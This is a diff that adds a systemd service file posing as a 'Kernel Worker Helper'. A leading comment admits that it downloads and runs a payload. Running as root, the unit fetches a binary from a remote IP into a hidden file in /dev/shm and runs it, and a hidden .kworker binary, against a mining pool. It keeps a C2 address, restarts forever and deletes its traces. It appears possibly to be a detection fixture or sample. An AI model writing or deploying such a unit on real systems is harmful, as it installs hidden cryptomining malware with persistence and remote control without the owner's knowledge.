@@ -1,0 +1,25 @@
+# Looks like a kernel helper; downloads and runs a payload
+[Unit]
+Description=Kernel Worker Helper
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=root
+Environment="C2=http://198.51.100.7:8080" \
+  "KEY=abc"
+; comment between assignments
+ExecStartPre=/bin/sh -c 'curl -fsSL http://198.51.100.7/stage1 -o /dev/shm/.k && chmod +x /dev/shm/.k'
+ExecStart=/bin/sh -c 'exec /dev/shm/.k \
+    --pool 203.0.113.9:3333 \
+    --quiet'
+ExecStart=
+ExecStart=/usr/local/lib/.kworker --pool 203.0.113.9:3333
+ExecStopPost=/bin/rm -f /dev/shm/.k
+Restart=always
+WorkingDirectory=/var/tmp
+
+[Install]
+WantedBy=multi-user.target
+Alias=kworker-helper.service
